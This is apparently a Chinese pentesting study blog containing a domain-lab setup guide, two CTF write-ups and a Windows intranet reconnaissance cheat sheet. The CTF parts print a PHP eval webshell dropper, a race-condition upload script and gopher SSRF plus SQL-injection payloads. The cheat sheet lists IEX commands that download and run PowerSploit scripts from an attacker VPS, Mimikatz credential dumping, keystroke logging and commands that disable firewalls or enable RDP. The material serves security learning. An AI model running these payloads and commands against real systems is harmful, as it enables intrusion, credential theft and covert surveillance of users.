R2服务器 1.配置IP Windows Server 2008 R2 的IP地址和DNS服务器地址如下： 测试一下，ping hacker.testlab 2.加入域 输入域的名称，点击”确定”，随后会让输入设置的用户名和密码： 重启计算机，登陆 输入net view /domain:hacker查看域用户，(每台域内机器均可查看) 搭建了一个简单的域环境 注：如果出现6118的问题，百度就可以解决，一般就是防火墙和Computer Browser未开启的问题 参考：net view 时报错 发生系统错误 6118 解决 3、Win7服务器 1.先更改ip地址，然后设置dns地，然后ping一下试试。 2.ping通，说明前半部分搭建成功。 3.更改计算机名，更改为win7-X64-test，将域名更改为hacker.testlab 4.然后输入域管理员的账号和密码后，立即重启。 这里在win7使用net user /domain命令时，总是报错：发生系统错误5，百度了很多，有的说是权限问题，但我即使以管理员身份也不行。最后看了N多篇搭建文章，也没啥成果，但是看了一篇文章说，重启后我们以域管理员的身份登录win7即可 如上图成功了，这里我也不清楚是否不以域管理员登录也能执行命令，但我感觉应该是搭建过程中少了点什么，这里也没深究。 不过似乎要实际加入域环境中需要用域账号登录，或许这里我存在着理解错误 到此搭建了一个最简单的内网环境，以后有需要在接着搭建，现在就先学习了解一下，为实战做准备。 四、参考文章 内网渗透]内网基础知识 内网渗透之基础知识 内网渗透基石篇：内网基础知识及域环境搭建 内网渗透环境搭建 内网渗透-环境搭建 域渗透笔记-域环境搭建 顺便记录一个激活系统的软件地址：神龙KMS来激活的系统，很方便 http://www.yishimei.cn/network/319.html","tags":["内网渗透"],"categories":["内网渗透"]},{"title":"攻防世界-wzsc_文件上传","path":"/2023/09/03/wzsc-wen-jian-shang-chuan/","content":"题目描述： 泰山杯 题目解题： 首先 上传了几个文件试试水 ，发现不论上传什么，他均会重定向到upload.php页面，于是我dir扫了一下，发现了 upload路由，访问看看 这里 1.jpg是正常图片文件，也就是说，只有你上传的文件符合题目要求，那么该文件就会保存在该目录下，这里 有一个hint.txt文件 Ã–_0 0vO Ow0 0w0 Ã–_0 Ã–_O Ã–.O o_o 0.O OvO o.0 owo o.Ã– Ã–.Ã– Ovo 0_Ã– Ã–_o owO O.0 owo Ã–_o owO O.0 owo Ã–_0 0wÃ– O.0 0w0 Ã–_0 OwO ov0 owo o_O O.Ã– Ã–vo 里面 内容如上，不过不清楚是什么 加密，先搁着，参考wp发现他们 直接有了源码，那估计上述加密应该表达的是源文件所在处 这里先进行审计 &lt;?php $allowtype = array(\"txt\",\"jpeg\",\"bmv\",\"doc\",\"docx\",\"gif\",\"png\",\"jpg\"); //白名单 $size = 10000000; $path = \"./upload/\"; $filename = $_FILES['file']['name']; if (is_uploaded_file($_FILES['file']['tmp_name'])){ if (!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){ exit(); } } else { exit(); } $newfile = $path.$filename; if ($_FILES['file']['error'] &gt; 0){ //若上传的文件报错，则删除 unlink($newfile); exit(); } $ext = array_pop(explode(\".\",$_FILES['file']['name']));//若上传的文件后缀名不在白名单内，则删除 if (!in_array($ext,$allowtype)){ unlink($newfile); exit(); } ?&gt; 这里也是 看了wp才知道可以利用竞争 竞争原理： 1.网站允许上传任意文件，然后检测文件中若有webshell，就删除文件；若不是指定类型文件，那么就使用unlink删除文件 2.在删除之前访问上传的php文件，从而执行上传文件中的php代码 上传代码如下 &lt;?php fputs(fopen(\"shell.php\", \"w\"), '&lt;?php @eval($_POST[\"shell\"]); ?&gt;'); ?&gt; 这个木马的作用就是，写入另一个木马，因为即使我们将文件上传到服务器上，他也只会存在很短的时间，不能够让我们有足够的时间执行命令，就算你把命令直接写入了，也可能会存在题目不回显的情况，或者来不及回显的情况，所以最稳妥的就是要利用仅存的时间写入另一个不会被删除的木马 先利用bp一直post那个文件 当然不想手动也可以配合爆破模式 进行 burpsuite重复发包 将两个数据包调整为无负载，并一直持续攻击，注意抓包的线程要比上传包多 注意线程数不要太低就行，接着运行py，同时开始爆破 使用burp suite配合脚本进行竞争 脚本如下： import requests import threading import os class RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = 'http://61.147.171.105:62431/upload/a.php' self.uploadUrl = 'http://61.147.171.105:62431/upload/shell.php' def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print('[*] create file shell.php success.') os._exit(0) def _upload(self): print('upload file...') rs = requests.get(self.uploadUrl) if rs.status_code == 200: print('[*] create file shell.php success.') os._exit(0) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get() if __name__ == '__main__': threads = 50 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() 上传成功，蚁剑连接得到flag 这里还有一个方法 a.php上传为： &lt;?php show_source('../flag.php');?&gt; 这里php直接show_source包含flag.php就不用写shell啦。 最终看了题目自带的wp也没发现那个hint.txt的作用，并且那个源码也不是做题时可以看到的，因此条件竞争完全是靠自己的尝试 参考文章： 【愚公系列】2023年06月 攻防世界-Web（wzsc_文件上传） 文件上传之条件竞争","categories":["攻防世界"]},{"title":"攻防世界-babyweb","path":"/2023/09/03/babyweb/","content":"题目描述： 国赛华东北-内网访问 题目解题： 进入页面没啥信息，抓包，扫目录均扫不到，之后又用acunetix扫了也没啥信息，因此没啥头绪了，开始借鉴wp。 看了wp发现 竟然有个ssrf.php页面，但我的dir竟然没扫到。。。于是将其添加到了字典里 那我们访问看看 如上图我们先输入127.0.0.1看看 发现进入了某个数据库页面，随后我随便输了几个查询语句，均会重定向到ssrf.php页面，这里又不知道 如何做了，看了wp发现他直接file协议读取了flag。。。看来我想复杂了 使用文件读取协议：file:///flag 看了官方wp后发现这似乎是非预期，官方采用gopher协议 导致非预期解是因为： preg_match('/file|http://|dict/i', $url); 正确的过滤方式应该是： preg_match('/file|http:\\/\\/|dict/i', $url); 但这里我并不理解为何file能逃逸过去，GPT 回答如下 与第一个正则表达式不同的是，这个正则表达式中的 \"http://\" 是带有转义斜杠 \"/\" 的。这意味着它只会匹配包含具体的字符串 \"http://\"，而不会匹配像 \"https://\" 或 \"http://example.com\" 这样的字符串。此外，它仍然匹配包含 \"file\" 或 \"dict\" 的字符串。 这里我复现一下官方 wp 然后就是ssrf+sql注入的考点，这个地方没有过多的过滤，主要考察的是mysql中取证能力 给出一个可行的sleep() poc sleep延时注入爆破fake_flag表的第一个字母，其他的poc以此类推 poc如下： gopher://127.0.0.1:80/_GET%20%2findex.php%253fquery%253Dselect%252520%25252a%252520from%252520fake_flag%252520where%252520if%252528mid%252528%252528select%252520flag%252520from%252520fake_flag%252520limit%2525200,1%252529,1,1%252529%25253D%252522t%252522,sleep%2525283%252529,0%252529%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a 在注入之后，会发现没有办法得到flag，这个时候需要去考虑到底是不是没有注入完全部的数据库 因为database和show被过滤了，所以看不到其他数据库 但是通过information_schema.processlist表格来查看正在运行的sql命令 发现可疑数据库名：hintda91947e762d8c1d0d1b3d72d3369629 然后访问da91947e762d8c1d0d1b3d72d3369629.php 发现也是需要内网，而且提示 you need admin 在输入框输入da91947e762d8c1d0d1b3d72d3369629 发现回显了admin 说明这个时候我们是管理员， 然后就需要我们带着这个cookie去登录da91947e762d8c1d0d1b3d72d3369629.php页面 所以我们最后的poc为 输入密码打sql注入然后得到setcookie的值 curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252findex.php%253fquery%253Dda91947e762d8c1d0d1b3d72d3369629%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a 得到返回的页面内容里面的set phpsessid ru1n2mphovds3qosjg3n8o3661 然后带着这个sessionid继续打 curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252fda91947e762d8c1d0d1b3d72d3369629.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250aCookie%3A%20PHPSESSID%3Dru1n2mphovds3qosjg3n8o3661%3B%250d%250a 但是这个过程有点懵 参考文章： 【愚公系列】2023年06月 攻防世界-Web（babyweb）","categories":["babyweb"]},{"title":"内网渗透学习-Windows信息搜集篇-持续更新","path":"/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/","content":"当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。 判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的 0x01 机器角色判断 文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机 DNS服务器：端口53，可通过DNS服务器获取内网web系统信息，或者探测域信息 DHCP服务器：查看内网多组网段信息，更多的获取拓补信息 开发测试服务器：获取源码，新的信息资产，多存在弱口令 代理服务器：获取服务器账号，拿到各种密码 web服务器：可能需要提权(一般接触到的环境) 个人PC：查看是否存在域环境 0x02 本机信息收集 包括操作系统、权限、内网IP段、杀软、端口、服务、补丁情况、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软一般都是批量安装的。文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。 如果由于使用了x86的shell无法使用命令，需要在命令前加上c:\\windows\\sysnative，这样就能执行x64的命令了。 2.1 查看主机名 hostname 2.2 查看版本 ver 2.3 查看所有环境变量 set 2.4 查看安装驱动 DRIVERQUERY 2.5 查看操作系统信息 2.5.1 架构 wmic os get osarchitecture 2.5.2 系统名 wmic os get caption 2.6 查看逻辑盘 wmic logicaldisk get caption 2.7 本机网络配置 ipconfig /all - ip地址信息 netstat -ano - 端口信息 arp -a - arp记录信息 2.8 查看当前系统版本 tip：wmic命令 顺便了解一下wmic命令作用 WMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令 wmic OS get Caption,CSDVersion,OSArchitecture,Version 2.9 查看体系结构 echo %PROCESSOR_ARCHITECTURE% 2.10 查询操作系统及软件信息 systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" ## 英文系统 systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\" ## 中文系统 这里不知为何打不开，找了几篇文章，感觉是环境变量的问题，设置了之后又发现语法错误，双引号是中文版的。。。，好在最后成功了，且为中文系统 2.11 查看.net framework版本 reg query \"HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\" /s /v version | findstr /i version | sort /+26 /r 2.12 查看补丁列表 systeminfo 2.13 查看补丁的名称、描述、ID、安装时间等 wmic qfe get Caption,Description,HotFixID,InstalledOn 2.14 PowerShell收集软件的版本信息 powershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name, version\" 2.15 查看安装的软件的版本、路径等 wmic product get name, version 查看软件比较靠谱的做法是远程加载本地ps文件，cs中可以使用powershell-import,上传ListInstallProgram.ps1后输入 powershell Get-list 将文件放到靶机，本地加载也可以 shell powershell -exec bypass -Command \"&amp; {Import-Module 'C:\\Users\\HackerQWQ\\Desktop\\ListInstalledProgram.ps1';Get-list}\" 这里尝试了半天，不知道从哪下手，还是对cs不熟悉，之后深入学习慢慢搞 2.16 查看当前用户权限 whoami &amp;&amp; whoami /priv 2.17 查询本机服务信息 wmic service list brief 2.18 查看开启的服务 net start 2.19 wmic查询进程信息 wmic process list brief 2.20 查看进程 tasklist /svc 2.21 查看启动程序信息 wmic startup get command,caption 2.22 查看计划任务(需要高权限) at（win10之前） chtasks /query /fo LIST /v（win10之后） 2.23 查看主机开机时间 net statistics workstation 2.24 查看本机用户列表 net user 2.25 获取本地管理员信息 net localgroup administrators 2.26 查看当前在线用户 query user || qwinsta 2.27 查看在线用户 quser 2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限) net session 2.29 查询端口列表 Windows: netstat -ano linux: netstat -tnlp 2.30 查看本机共享列表和可访问的域共享列表 net share （445端口） 2.31 查找共享列表 wmic share get name,path,status 2.32 磁盘映射 net use k: \\192.168.1.10\\c$ 这里不太懂，没搞出来 2.33 查询路由表 route print 可用接口的ARP缓存表。局域网内arp -a，查看是否有重复的mac地址，判断是否存在arp欺骗。服务器绑定mac地址方式防止arp欺骗 arp -a 2.34 查看远程连接信息 cmdkey /l 2.35 查看杀软 WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 暂时没有 2.36 查看本地密码策略 net accounts 2.37 查看hosts文件： linux:cat /etc/hosts windows:type c:\\Windows\\system32\\drivers\\etc\\hosts 2.38 查看dns缓存 ipconfig /displaydns 列举安装的软件 ListInstalledProgram项目地址:https://github.com/3gstudent/ListInstalledPrograms 自动信息收集 我们可使用自动化脚本WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。 执行后，会将信息收集的结果写入HTML文档。 项目地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar 获取主机信息也可以用Seatbelt.exe，项目地址：https://github.com/GhostPack/Seatbelt/tree/master，需要编译，放到靶机上执行下列命令 shell Seatbelt.exe -group=all &gt; env.txt 最好先免杀一下，不然360会一直警告,cs上的插件也有集成Seatbelt，可以直接使用插件 --这里等学了免杀在搞吧 2.39 常见查毒软件进程 tasklist /svc 随后将结果放到avList中对比查看 进程 软件名称 360SD.EXE 360杀毒 360TRAY.EXE 360实时保护 ZHUDONGFANGYU.EXE 360主动防御 KSAFETRAY.EXE 金山卫士 SAFEDOGUPDATECENTER.EXE 服务器安全狗 MCAFEE MCSHIELD.EXE 迈克菲杀毒软件 EGUI.EXE NOD32 AVP.EXE 卡巴斯基 AVGUARD.EXE 小红伞 BDAGENT.EXE BITDEFENDER 可以用avList自动判断,项目地址:https://github.com/gh0stkey/avList 2.40 浏览器信息收集 项目地址：https://github.com/moonD4rk/HackBrowserData 0x03 域环境信息收集 3.1 判断是否存在域 ipconfig /all 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等。 3.2 解析域名ip 通过反向解析查询命令nslookup来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上 nslookup hacker.testlab(这里写自己的域控制服务器域名) 3.3 查看当前权限 whoami 3.4 获取域SID whoami /all 3.5 查询指定用户的详情信息 net user xxx /domain 3.6 查看域内所有账号 net user /domain 3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配 systeminfo 域名 域控制器 3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配 net config workstation 3.9 查看时间可以找到域控 net time /domain 3.10 查看域密码策略 net accounts /domain 3.11 查看当前登录域 net config workstation 3.12 登录本机的域管理员 net localgroup administrators /domain 3.13 获取域控ip ping -a xxx.com 3.14 查询域 net view /domain 3.15 查询域内的所有计算机 net view /domain:HACKER 3.16 查询域的所有组（enterprise admins组权限最大） net group /domain 3.17 SPN扫描 setspn -T domain -q / 这里我估计应该是没有spn吧 3.18 查看域管理员的用户组 net group “domain admins” /domain 3.19 查询域系统管理员用户组 net group \"Enterprise admins\" /domain 3.20 查看域控制器 net group \"domain controllers\" /domain 3.21 查看域控制器的机器名 nltest /DCLIST:hacker 3.22 查看dns缓存 ipconfig /displaydns 3.23 列域控c盘文件(需要域管理员权限) dir \\\\WIN7-TEST.hacker.testlab\\c$ 这里不知为何我找不到指定的文件，或许是命令错误，找了半天发现是域名前面应该是两条反斜杠 3.24 查询所有域成员计算机列表 net group \"domain computers\" /domain 3.25 获取域信任信息 nltest /domain_trusts 3.26 获取域内用户的详细信息 wmic useraccount get /all 3.27 查看存在的用户 dsquery user 这条命令只能在winserver服务器才能使用 3.28 查询所有计算机名称 dsquery computer 3.29 攻击主机CMD扫描同网段存活ip windows # 扫c段 for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr \"TTL =\" Linux #!/bin/bash NET=10.168.1. for IP in {100..115} do if `ping -c2 -i0.2 -w2 $NET$IP &amp;&gt; /dev/null` then echo -e \"$NET$IP is \\033[31mup\\033[0m\" else echo -e \"$NET$IP is \\033[32mdown\\033[0m\" fi done 扫b段 for i in 192.168.{1..254}.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done 3.30 PowerView.ps域内信息收集 Invoke-NetView //查域内环境 Invoke-ShareFinder //查共享目录 Invoke-MapDomainTrusts //查看域内信任关系 Get-NetLocalGroup -HostName TARGET(主机名) //查看指定用户的登录时间、所属组情况 3.31 cs信息收集 target组信息的命令 net group \\Target net localgroup \\target 组名 获取远程目录 shell dir \\target\\c$ shell dir /S /B \\target\\c$\\users //递归获取多级目录及文件 cs通过powershell命令获取目录信息 powersehll Invoke-Command -ComputerName target -ScriptBlock{dir c:} powershell Invoke-Command -ComputerName target -ScriptBlock{net localgroup administrators} cs通过mimikatz抓取远程哈希值 powershell-import Invoke-Mimikatz.ps1 powershell Invoke-Mimikatz -DumpCreds powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logonPasswords full”‘ 3.32 防火墙相关 关闭防火墙 Windows Server 2003及之前的版本(admin)： netsh firewall set opmode disable Windows Server 2003之后的版本(admin)： netsh advfirewall set allprofiles state off 查看防火墙配置： netsh firewall show config 修改防火墙配置 Windows Server 2003及之前的版本，允许指定程序全部连接： netsh firewall add allowedprogram c: c.exe \"allow nc\" enable Windows Server 2003之后的版本，情况如下。 允许指定程序进入： netsh advfirewall firewall add rule name=\"pass nc\" dir=in action=allow program=\"C: c.exe\" 允许指定程序退出： netsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C: c.exe\" 允许3389端口放行： netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 自定义防火墙日志的储存位置 netsh advfirewall set currentprofile logging filename \"C:\\windows\\temp\\fw.log\" 3.33 查询代理配置情况 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" 3.34 查询并开启远程连接服务 查看远程连接端口 0xd3d转换后就是3389 REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber 在Windows Server 2003中开启3389端口 wmic path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 在Windows Server 2008和Windows Server 2012中开启3389端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 3.35 端口扫描 1. telnet端口连接 没有开启的话去“打开或关闭windows功能”开启 telnet只用于确认端口是否开启用，不拿来端口扫描 telnet &lt;主机&gt; &lt;端口&gt; telnet 192.168.52.138 445 2. PowerSploit 中的Invoke-portscan.ps1脚本 下载地址：https://github.com/PowerShellMafia/PowerSploit 端口扫描利用到工具包中的Portscan.ps1 powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/powersploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports '445,1433,8080,80,3389'\" // 或者扫描全部的端口：-Ports \"1-65535\" 3. Nishang中的Invoke-portscan.ps1 下载地址：https://github.com/samratashok/nishang 该脚本可用于发现主机、解析主机名、扫描端口。 powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port '1-65535'\" // -ResolveHost：解析主机名 4. Nmap扫描 一般通过挂代理，nmap远程扫描 《内网渗透测试：隐藏通讯隧道技术》 5. Metasploit 端口扫描模块 Metasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的： auxiliary/scanner/portscan/tcp auxiliary/scanner/portscan/tcp auxiliary/scanner/portscan/ack 6. 收集域内端口的banner信息 banner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在ExploitDB等平台上面找到相关的利用方式。 获取Banner 扫描到端口后就要获取到其Banner信息，接着就可以在漏洞库里查找poc，这个可以找一下常见的端口的服务来得知 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp：文件传输协议 允许匿名上传、下载、爆破、嗅探、溢出和后门 22 ssh：远程连接 爆破OpenSSH；28个退格 23 telnet：远程连接 爆破\\嗅探、弱口令 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输\\DNS劫持\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\\欺骗 80/443/8080 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 110 pop3 爆破、嗅探 139 samba 爆破\\未授权访问\\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap目录访问协议 注入攻击\\未授权访问，弱口令 512/513/514 linux rexec 直接使用rlogin\\爆破 873 rsync 未授权访问\\文件上传 1080 socket 爆破：进行内网渗透 1352 lotus Domino邮件服务 爆破：弱口令\\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\\注入攻击\\SA弱口令 1521 oracle 爆破：TNS\\注入攻击\\反弹shell 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\\拒绝服务\\注入\\提权 3389 rdp 爆破\\Shift后门 3690 SVN服务 SVN泄露\\未授权访问 4848 glassfish 爆破：控制台弱口令\\认证绕过 5000 sybase/DB2 爆破\\注入 5432 postgresql 缓冲区溢出\\注入攻击\\爆破：弱口令 5632 pcanywhere 拒绝服务\\代码执行，抓取密码 5900 vnc 爆破：弱口令\\认证绕过 6379 redis 未授权访问\\爆破：弱口令 7001/7002 weblogic Java反序列化\\控制台弱口令\\控制台部署webshell 8069 zabbix 远程命令执行\\SQL注入 8080/8089 JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 websphere控制台 爆破：控制台弱口令\\Java反序列 9200/9300 elasticsearch 远程代码执行 10000 webmin控制面板 弱口令 11211 memcacache 未授权访问 27017/27018 mongodb 爆破\\未授权访问 50000 SAP Management Console 远程执行 7. 使用Nmap获取banner nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt; 我这里没banner，就借用图片了 8. 使用nc获取banner nc -nv &lt;IP地址&gt; &lt;端口&gt; 3.36 存活主机扫描 nbtscan nbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。 下载地址：https://github.com/MrAnonymous-1/nbtscan 将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描： //扫描一个网段 nbtscan-1.0.35.exe 192.168.17.0/24 //扫描两个网段 nbtscan.exe 192.168.1.0/24 192.168.2.0/24 参数解释： SHARING：该主机存在正在运行的文件和打印共享服务 DC：该机器可能是域控制器 ?：没有识别处该机器的NetBIOS资源 ping 基于icmp扫描内网 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr \"TTL=\" //兼容win7 for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i \"Ping\" //扫b段 for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i \"Ping\" arp-scan.exe 基于arp协议来进行存活性扫描 项目地址：https://github.com/QbsuranAlang/arp-scan-windows- 这个工具的速度比上一个快很多 批处理脚本 这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。 @echo off @echo. @FOR /F \"usebackq delims=, \" %%J IN (`net view /domain ^|find \"命令成功完成\" /v ^|find \"The command completed successfully.\" /v ^|find \"命令成功完成\" /v ^|find \"--\" /v ^|find \"Domain\" /v ^|find \"\" /v ^|find \"コマンドは正常に終了しました\" /v /i`) do ( @echo ====== Domain:%%J ========= @FOR /F \"usebackq eol=; delims=, \" %%i in (`net view /domain:%%J ^|findstr \"\\\\\"`) do ( @FOR /F \"usebackq eol=; tokens=1,2,3* delims=\\\\\" %%a in (`@echo %%i`) do ( ping %%a -4 -n 1 -w 100 |find /i \"ping\" &gt; %%a.txt @FOR /F \"tokens=2 delims=[]\" %%b in (%%a.txt) do @echo \\\\%%a = [%%b] @del /f /q %%a.txt ))) @echo ====== Getting IP Complete ====== msf主机存活扫描 auxiliary/scanner/discovery/udp_sweep auxiliary/scanner/discovery/udp_probe auxiliary/scanner/netbios/nbname MSF建立会话拿到shell，即可直接执行DOS命令至今进行信息收集。也可以进行直接执行run winenum可以一键收集记录。 run winenum 3.37 定位域管理员 psloggeddon.exe 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon psloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。 psloggedon.exe [-] [-l] [-x] [\\\\computername或username] 查看DC(域控)登录过的机器 PsLoggedon64.exe -accepteula \\\\DC 查看本地登录的用户 PsLoggedon64.exe -accepteula 查看指定用户登录的计算机 PsLoggedon64.exe -accepteula Administrator PVEFindADUser.exe 下载地址：https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/ PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置**.NET Framework 2.0 环境**，并需要有管理员权限。 PVEFindADUser.exe &lt;参数&gt; 我们一般直接运行PVEFindADUser.exe -current命令，即可显示域中所有计算机上当前登陆的所有用户。 显示指定用户登录的计算机 current[“username”] 如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\\Username)，则显示该用户登陆的计算机 PVEFindADUser.exe -current redteam.org\\dc //PVEFindADUser.exe -current domain\\username powerview.ps1 powerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。 Invoke-UserHunter：**搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。**它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。 如下，可以看到本地域有一个域管理员： net group \"domain controllers\" /domain 我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess)来定位他们： powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1');Invoke-UserHunter 详情请执行Get-Help Invoke-UserHunter命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。 获取指定用户在线机器： 3.38 Empire信息收集 # 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等 usemodule situation_awareness/host/winenum # 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限 usemodule situational_awareness/host/computerdetails 3.39 powersploit 信息收集 项目地址：https://github.com/PowerShellMafia/PowerSploit ，已经停止维护 建立会话后的meterpreter： #加载模块 load powershell #调用本地ps脚本 powershell_import /usr/share/windows-resources/powersploit/Recon/xx.ps1 #命令执行 powershell_execute Get-NetDomain #获取当前的域名称 Get-NetDomain #返回所有域内成员的详细信息 Get-Netuser #获取所有的域内的控制器信息 Get-NetDomainController #获取所有域内机器的名称 Get-NetComputer #获取域内的所有的网络共享 Get-Netshare #获取指定服务的远程连接信息 Get-NetRDPSESSION #获取进程的详细信息 Get-NetProcess # 获取活动目录的信息 Get-ADOPJECT #判断用户是否登陆计算机且用户是否有管理员权限 invoke-processhunter powersploit无文件攻击 将下载的文件放在vps上面。确保目标服务器可以访问： 如：http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1 #在目标机导入脚本： iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1\") #扫描网段、端口 invoke-portscan -hosts 192.168.1.1/24 -ports \"21,22,80,139,80,445\" #invoke-mimikatz抓取hash iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1\") #导hash Invoke-Mimikatz -dumpcreds #get-keystrokes键盘记录 iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1\") #将键盘记录保存到123.txt里面 Get-Keystrokes -logpath C:\\Users\\admin\\123.txt 3.40 翻翻配置文件 一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件： findstr /s /m \"password\" *.* findstr /s /i /m /r \"defineclass remoteserver\" Web目录 \\*.jsp # /r 表示正则，/s表示遍历子目录，/m表示不显示匹配 Linux查文件： find Web应用目录 -iname \"*.jsp*\" | xargs egrep -l -i \"classloader\" |xargs egrep -l -i \"cipher\" find Web应用目录 -iname \"*.php*\" | xargs egrep -l -i \"openssl_decrypt\" |xargs egrep -l -i \"file_get_contents\" 敏感路径 %WINDIR% %WINDIR%\\system32\\ %TEMP% %LOCALAPPDATA% %APPDATA% C:\\TEMP\\ 